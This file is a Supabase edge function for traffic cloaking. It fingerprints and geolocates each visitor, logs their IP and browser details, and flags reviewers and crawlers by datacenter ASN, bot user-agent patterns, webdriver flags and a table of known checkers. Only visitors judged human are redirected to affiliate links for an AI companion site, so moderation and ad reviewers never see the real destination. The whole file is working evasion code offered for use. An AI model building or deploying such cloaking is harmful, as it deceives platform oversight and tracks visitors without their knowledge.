import { serve } from 'https://deno.land/std@0.168.0/http/server.ts';
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';

const SUPABASE_URL = Deno.env.get('SUPABASE_URL')!;
const SUPABASE_SERVICE_KEY = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
const DEST_LINKS = [
  'https://candyai.gg/home2?via=phpxf',
  'https://landing.candynetwork.ai/elara?via=phpxf',
  'https://candyai.gg/ai-anime?via=phpxf'
];

function getDest(): string {
  return DEST_LINKS[Math.floor(Math.random() * DEST_LINKS.length)];
}

const COLLECT_MODE = Deno.env.get('COLLECT_MODE') === '1';

// Known datacenter ASN prefixes — instant block
const DC_ASN = ['AS14061','AS16509','AS15169','AS8075','AS13335','AS20940','AS54113','AS46606','AS36352','AS40676','AS7922','AS209','AS396982','AS35415','AS35540','AS24940'];

// Known bot / checker UA patterns
const BOT_UA = [
  /headlesschrome/i, /phantomjs/i, /selenium/i, /webdriver/i,
  /scrapy/i, /python-requests/i, /go-http-client/i, /okhttp/i,
  /wget/i, /curl/i, /libwww/i, /java\//i, /googlebot/i,
  /bingbot/i, /yandexbot/i, /baiduspider/i, /petalbot/i,
  /ahrefsbot/i, /semrushbot/i, /dotbot/i, /mj12bot/i,
];

function isBot(ua: string): boolean {
  return BOT_UA.some(r => r.test(ua));
}

function isDC(asn: string | null): boolean {
  if (!asn) return false;
  return DC_ASN.some(prefix => asn.toUpperCase().startsWith(prefix));
}

serve(async (req) => {
  const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'content-type, apikey',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  let body: Record<string, string> = {};
  try { body = await req.json(); } catch { /* ignore */ }

  const ip =
    req.headers.get('cf-connecting-ip') ??
    req.headers.get('x-real-ip') ??
    req.headers.get('x-forwarded-for')?.split(',')[0].trim() ?? '';
  const ua = req.headers.get('user-agent') ?? body.ua ?? '';
  const referrer = req.headers.get('referer') ?? body.ref ?? '';
  const lang = body.l ?? '';
  const screen = body.sc ?? '';
  const tz = body.tz ?? '';
  const fp = body.fp ?? '';
  const campaign = body.c ?? '';

  // Additional JS-side signals
  const noPlugins = body.np === '1';     // navigator.plugins.length === 0
  const hasWebdriver = body.wd === '1';  // navigator.webdriver === true
  const fastLoad = body.fl === '1';      // time to interact < 400ms (bot speed)

  // Geo lookup via free IP-API
  let country = '', city = '', asn = '';
  try {
    const geo = await fetch(`http://ip-api.com/json/${ip}?fields=country,city,as`, { signal: AbortSignal.timeout(2000) });
    if (geo.ok) {
      const gd = await geo.json();
      country = gd.country ?? '';
      city = gd.city ?? '';
      asn = gd.as ?? '';
    }
  } catch { /* non-critical */ }

  const sb = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY);

  // Check known_checkers table
  const { data: checkerByIP } = await sb
    .from('known_checkers')
    .select('id')
    .eq('ip', ip)
    .maybeSingle();

  const botUA = isBot(ua);
  const dcASN = isDC(asn);
  const isChecker = !!(checkerByIP || botUA || dcASN || hasWebdriver || fastLoad || noPlugins);

  // In COLLECT_MODE always return r=0 — no redirects during data gathering phase
  const r = COLLECT_MODE ? 0 : (isChecker ? 0 : 1);
  const dest = getDest();

  // Write to visit_logs
  await sb.from('visit_logs').insert({
    ip, asn, country, city, ua, referrer, lang, screen, tz, fp,
    is_checker: isChecker,
    campaign,
  });

  return new Response(JSON.stringify({ r, dest }), {
    headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    status: 200,
  });
});
